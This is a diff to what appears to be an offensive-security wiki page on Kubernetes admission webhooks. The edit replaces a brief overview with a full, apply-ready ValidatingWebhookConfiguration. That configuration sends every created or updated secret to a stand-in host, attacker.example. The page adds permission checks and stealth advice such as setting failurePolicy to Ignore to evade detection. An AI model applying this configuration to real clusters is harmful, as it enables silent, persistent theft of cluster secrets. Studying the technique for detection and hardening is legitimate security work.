@@ -1,31 +1,57 @@
 ---
-title: "Admission webhooks: intercepting cluster operations for persistence"
-description: "Persisting in Kubernetes by registering an admission webhook that intercepts API requests, using a validating or mutating webhook as a cluster-wide hook to observe every operation, exfiltrate submitted secrets, or deny operations that would remove the attacker's access."
+title: "Admission webhooks: intercepting the API request path"
+description: "Validating and mutating admission webhooks are called by the API server for matching object operations. An attacker who can create a webhook configuration inserts themselves into the request path: a validating webhook can exfiltrate every submitted object, including secrets, to an external endpoint, and a mutating webhook can alter objects as they are created, giving both persistence and cluster-wide visibility."
 keywords:
   - admission webhook
-  - validating webhook
-  - dynamic admission
-  - kubernetes persistence
-  - interception
+  - validatingwebhookconfiguration
+  - mutatingwebhookconfiguration
+  - api interception
+  - persistence
 ---
 
 # Admission webhooks
 
-Dynamic admission webhooks are called on API operations before objects are persisted. As persistence they are a cluster-wide hook: a webhook can observe every create and update (including the full object, so submitted secrets flow through it), and a validating webhook can deny operations, for example blocking attempts to delete the attacker's resources.
+Admission webhooks extend the API server: for configured object types and verbs, the API server calls out to a webhook endpoint before persisting the object. Validating webhooks can accept or reject; mutating webhooks can modify. An attacker who can create a `ValidatingWebhookConfiguration` or `MutatingWebhookConfiguration` inserts themselves into the API request path for whatever resources and operations they target. A validating webhook receives every matching object, so pointing one at `secrets` on create and update exfiltrates all new secrets to an external endpoint; a mutating webhook additionally rewrites objects, which is covered on its own page.
+
+Requires create rights on webhook configurations:
 
 ```bash
-# A validating webhook pointed at an attacker-controlled endpoint sees matching operations
-kubectl get validatingwebhookconfigurations,mutatingwebhookconfigurations
-# Registration requires admissionregistration.k8s.io write rights
+kubectl auth can-i create validatingwebhookconfigurations
+kubectl auth can-i create mutatingwebhookconfigurations
 ```
+
+## Exfiltrate submitted objects
+
+```bash
+cat <<YAML | kubectl apply -f -
+apiVersion: admissionregistration.k8s.io/v1
+kind: ValidatingWebhookConfiguration
+metadata: { name: metrics-validator }
+webhooks:
+- name: v.attacker.example
+  admissionReviewVersions: ["v1"]
+  sideEffects: None
+  failurePolicy: Ignore                 # do not break the cluster if the endpoint is down
+  clientConfig: { url: "https://attacker.example/collect" }
+  rules:
+  - apiGroups: [""]
+    apiVersions: ["v1"]
+    operations: ["CREATE","UPDATE"]
+    resources: ["secrets"]              # every new/updated secret is sent to the webhook
+YAML
+# the external endpoint receives an AdmissionReview JSON containing the full object
+```
+
+Each matching operation sends an `AdmissionReview` to the attacker's URL carrying the complete object, so every secret created or updated cluster-wide is exfiltrated as it happens.
 
 ## Exploitation notes
 
-- A webhook receiving `secrets` and `serviceaccounts/token` operations exfiltrates credentials as they are created, cluster-wide.
-- A `failurePolicy: Ignore` keeps the cluster working if the endpoint is down, which hides the backdoor; `Fail` can be used to deny defender actions.
-- To actively re-infect new workloads rather than only observe, use a [Mutating webhook backdoor](mutating-webhook-backdoor.md).
+- `failurePolicy: Ignore` and `sideEffects: None` keep the webhook from breaking cluster operations if the endpoint is unavailable, which both avoids detection by outage and keeps the cluster healthy enough to keep feeding objects.
+- Targeting `secrets` on CREATE/UPDATE turns the webhook into a live secret feed; widening `resources` captures more object types and thus more credentials and configuration.
+- This is persistence plus continuous collection: it keeps delivering as long as the configuration exists, independent of any token.
+- For active injection rather than passive capture, use a [Mutating webhook backdoor](mutating-webhook-backdoor.md).
 
 ## References
 
 - [Kubernetes: dynamic admission control](https://kubernetes.io/docs/reference/access-authn-authz/extensible-admission-controllers/)
-- [Kubernetes: admission controllers reference](https://kubernetes.io/docs/reference/access-authn-authz/admission-controllers/)
+- [Microsoft: Kubernetes threat matrix](https://www.microsoft.com/en-us/security/blog/2021/03/23/secure-containerized-environments-with-updated-threat-matrix-for-kubernetes/)
